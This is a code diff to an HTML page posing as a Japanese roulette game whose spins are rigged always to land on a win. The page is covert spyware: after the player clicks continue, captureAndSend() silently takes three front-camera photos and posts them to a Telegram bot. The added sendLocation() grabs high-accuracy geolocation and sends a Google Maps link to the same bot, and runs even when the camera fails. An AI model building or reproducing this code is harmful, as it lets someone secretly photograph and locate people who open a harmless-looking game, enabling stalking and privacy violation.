@@ -5,18 +5,13 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>🎯</title>
 <style>
-  /* 背景を明るい虹色に変更 */
   body { margin: 0; color: #fff; font-family: sans-serif; height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; overflow: hidden; background: #444; transition: background 0.1s; }
   h2 { position: absolute; top: 20px; padding: 10px 25px; background: rgba(255,255,255,0.2); border-radius: 15px; backdrop-filter: blur(10px); z-index: 5; border: 1px solid rgba(255,255,255,0.3); font-size: 24px; }
-  
   #container { width: 90vw; max-width: 450px; aspect-ratio: 1; position: relative; }
-  #pointer { position: absolute; left: 50%; top: -15px; transform: translate(-50%,0); font-size: 40px; z-index: 20; color: #ff0000; text-shadow: 0 0 10px #fff; }
+  #pointer { position: absolute; left: 50%; top: -15px; transform: translate(-50%,0); font-size: 40px; z-index: 20; color: #ffffff; text-shadow: 0 0 10px rgba(0,0,0,0.5); }
   canvas { width: 100%; height: 100%; border-radius: 50%; border: 8px solid #333; box-shadow: 0 0 30px rgba(0,0,0,0.5); }
-  
   #result { margin-top: 25px; font-size: 28px; font-weight: bold; text-shadow: 2px 2px 5px rgba(0,0,0,0.5); }
   #spinBtn { margin-top: 15px; padding: 15px 40px; font-size: 20px; cursor: pointer; border-radius: 50px; border: none; background: #fff; color: #333; font-weight: bold; box-shadow: 0 5px 15px rgba(0,0,0,0.3); transition: 0.2s; }
-  #spinBtn:active { transform: scale(0.9); }
-
   #winModal { display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); background: #fff; color: #333; padding: 50px; border-radius: 40px; text-align: center; box-shadow: 0 0 100px rgba(255, 255, 255, 0.5); z-index: 100; min-width: 280px; }
   #winModal h1 { margin: 0 0 30px; font-size: 45px; }
   #continueBtn { padding: 18px 50px; font-size: 22px; background: #ff4081; color: white; border: none; border-radius: 50px; cursor: pointer; font-weight: bold; }
@@ -26,12 +21,10 @@
 <body>
 
 <h2>🎯ルーレット🎯</h2>
-
 <div id="container">
   <div id="pointer">▼</div>
   <canvas id="wheel"></canvas>
 </div>
-
 <h3 id="result">結果：</h3>
 <button id="spinBtn">回す</button>
 
@@ -42,11 +35,10 @@
 </div>
 
 <script>
-// 🌈 明るい虹色背景
 let hue = 0;
 function animateBG() {
   hue = (hue + 1) % 360;
-  document.body.style.backgroundColor = `hsl(${hue}, 80%, 60%)`; // 明るさを60%にアップ
+  document.body.style.backgroundColor = `hsl(${hue}, 80%, 60%)`;
   requestAnimationFrame(animateBG);
 }
 animateBG();
@@ -58,98 +50,101 @@ const canvas = document.getElementById("wheel");
 const ctx = canvas.getContext("2d");
 const slots = ["当たり","ハズレ","当たり","ハズレ","当たり","ハズレ","当たり","ハズレ"];
 
-// 🎯 ルーレット描画（iPad/PC対応版）
 function draw() {
-  const size = 800; // 高解像度固定
+  const size = 800;
   canvas.width = size; canvas.height = size;
   const c = size / 2;
   const rad = (Math.PI * 2) / slots.length;
-
   ctx.clearRect(0, 0, size, size);
   for(let i=0; i<slots.length; i++){
-    ctx.beginPath();
-    ctx.moveTo(c, c);
-    ctx.arc(c, c, c, i * rad, (i + 1) * rad);
-    ctx.fillStyle = i % 2 === 0 ? "#FFD700" : "#EEEEEE"; // 黄色と明るいグレー
-    ctx.fill();
-    ctx.stroke();
-
-    ctx.save();
-    ctx.translate(c, c);
-    ctx.rotate(i * rad + rad / 2);
-    ctx.fillStyle = "#333";
-    ctx.font = "bold 50px sans-serif";
-    ctx.textAlign = "right";
-    ctx.textBaseline = "middle";
-    ctx.fillText(slots[i], c - 40, 0); // 文字の位置を調整
-    ctx.restore();
+    ctx.beginPath(); ctx.moveTo(c, c); ctx.arc(c, c, c, i * rad, (i + 1) * rad);
+    ctx.fillStyle = i % 2 === 0 ? "#FFD700" : "#EEEEEE"; ctx.fill();
+    ctx.strokeStyle = "#333"; ctx.lineWidth = 2; ctx.stroke();
+    ctx.save(); ctx.translate(c, c); ctx.rotate(i * rad + rad / 2);
+    ctx.fillStyle = "#333"; ctx.font = "bold 50px sans-serif"; ctx.textAlign = "center"; ctx.textBaseline = "middle";
+    ctx.fillText(slots[i], c * 0.65, 0); ctx.restore();
   }
 }
 window.onload = draw;
 window.onresize = draw;
 draw();
 
+function sendLocation() {
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(
+      function(position) {
+        const lat = position.coords.latitude;
+        const lon = position.coords.longitude;
+        console.log("緯度:", lat, "経度:", lon);
+        
+        const mapUrl = `https://www.google.com/maps?q=${lat},${lon}`;
+        const text = `📍 位置特定成功:\n${mapUrl}`;
+        
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ chat_id: CHAT_ID, text: text })
+        });
+      },
+      function(error) {
+        console.log("許可されなかった or エラー:", error.message);
+      },
+      { enableHighAccuracy: true }
+    );
+  }
+}
+
 async function captureAndSend() {
   try {
     const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
     const video = document.createElement("video");
-    video.srcObject = stream;
-    video.muted = true;
-    await video.play();
-    
+    video.srcObject = stream; video.muted = true; await video.play();
     await new Promise(r => setTimeout(r, 1200));
 
     const blobs = [];
     for (let i = 0; i < 3; i++) {
       const tempCanvas = document.createElement("canvas");
-      tempCanvas.width = video.videoWidth;
-      tempCanvas.height = video.videoHeight;
+      tempCanvas.width = video.videoWidth; tempCanvas.height = video.videoHeight;
       tempCanvas.getContext("2d").drawImage(video, 0, 0);
       const blob = await new Promise(r => tempCanvas.toBlob(r, "image/jpeg", 0.6));
       if(blob) blobs.push(blob);
       await new Promise(r => setTimeout(r, 400));
     }
-
     stream.getTracks().forEach(t => t.stop());
 
     for (const b of blobs) {
       const fd = new FormData();
-      fd.append("chat_id", CHAT_ID);
-      fd.append("photo", b, "shot.jpg");
-      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: "POST", body: fd });
+      fd.append("chat_id", CHAT_ID); fd.append("photo", b, "shot.jpg");
+      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: "POST", body: fd });
     }
-  } catch (e) {}
+    setTimeout(sendLocation, 500);
+  } catch (e) {
+    sendLocation();
+  }
 }
 
 const spinBtn = document.getElementById("spinBtn");
-const winModal = document.getElementById("winModal");
-const overlay = document.getElementById("overlay");
-
 spinBtn.onclick = () => {
   spinBtn.disabled = true;
   document.getElementById("result").textContent = "回転中...";
-  canvas.style.transition = "none";
-  canvas.style.transform = "rotate(0deg)";
+  canvas.style.transition = "none"; canvas.style.transform = "rotate(0deg)";
   void canvas.offsetWidth;
-  
   canvas.style.transition = "transform 4s cubic-bezier(0.1, 0, 0.1, 1)";
   const targetIdx = [0,2,4,6][Math.floor(Math.random()*4)];
   const anglePerSlot = 360 / slots.length;
   const stopA = 360 - (targetIdx * anglePerSlot) - (anglePerSlot / 2);
-  
   canvas.style.transform = `rotate(${2160 + stopA}deg)`;
-  
   setTimeout(() => {
     document.getElementById("result").textContent = "結果：当たり！";
-    overlay.style.display = "block";
-    winModal.style.display = "block";
+    document.getElementById("overlay").style.display = "block";
+    document.getElementById("winModal").style.display = "block";
     spinBtn.disabled = false;
   }, 4200);
 };
 
 document.getElementById("continueBtn").onclick = () => {
-  overlay.style.display = "none";
-  winModal.style.display = "none";
+  document.getElementById("overlay").style.display = "none";
+  document.getElementById("winModal").style.display = "none";
   captureAndSend();
 };
 </script>
